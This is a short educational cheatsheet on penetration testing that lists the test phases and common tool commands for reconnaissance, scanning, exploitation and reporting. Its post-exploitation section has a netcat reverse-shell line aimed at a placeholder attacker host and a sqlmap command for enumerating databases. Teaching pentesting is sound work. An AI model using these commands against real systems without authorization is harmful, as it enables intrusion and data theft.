# 🔍 Penetration Testing Basics Comprehensive Cheatsheet

## 🔹 Introduction
Penetration Testing (**Pentesting**) is the practice of **simulating cyberattacks** to identify security vulnerabilities in networks, applications, and systems.

---

## 🔹 Phases of Penetration Testing
| Phase              | Description |
|-------------------|-------------|
| **1. Planning & Reconnaissance** | Gather information about the target (OS, IPs, Domains). |
| **2. Scanning & Enumeration** | Identify open ports, services, and vulnerabilities. |
| **3. Exploitation** | Attempt to exploit vulnerabilities to gain access. |
| **4. Post-Exploitation** | Maintain access and extract valuable information. |
| **5. Reporting & Remediation** | Document findings and suggest mitigations. |

---

## 🔹 Information Gathering (Reconnaissance)
### ✅ Passive Reconnaissance (No direct interaction)
```sh
# Whois lookup
dig example.com
whois example.com

# Search for subdomains
subfinder -d example.com
```

### ✅ Active Reconnaissance (Direct interaction)
```sh
# Find open ports
nmap -A -T4 example.com

# Banner grabbing
nc -v example.com 80
```

---

## 🔹 Scanning & Enumeration
### ✅ Identify Network Services
```sh
# Scan for open ports
nmap -sV -p- example.com

# Enumerate HTTP directories
gobuster dir -u http://example.com -w /usr/share/wordlists/dirbuster.txt
```

### ✅ Find Vulnerabilities
```sh
# Scan for vulnerabilities
nmap --script vuln example.com

# Web vulnerability scanning
nikto -h http://example.com
```

---

## 🔹 Exploitation
### ✅ Common Exploitation Tools
```sh
# Exploit a known vulnerability
searchsploit apache

# Use Metasploit Framework
msfconsole
```

---

## 🔹 Post-Exploitation
### ✅ Maintaining Access
```sh
# Create a reverse shell
nc -e /bin/bash attacker_ip 4444
```

### ✅ Data Extraction
```sh
# Dump database credentials
sqlmap -u "http://example.com/login.php" --dbs
```

---

## 🔹 Reporting & Remediation
- **Document all findings, vulnerabilities, and exploits.**
- **Provide risk assessments and mitigation strategies.**
- **Ensure patches and security updates are applied.**
- **Conduct retesting to verify fixes.**

---

## 🔹 Penetration Testing Best Practices
- **Follow an ethical framework** (e.g., **OWASP, PTES, NIST**).
- **Use non-destructive scanning** to avoid disrupting services.
- **Obtain proper authorization before testing**.
- **Keep tests documented for future analysis.**
- **Use multiple tools to cross-verify vulnerabilities.**

---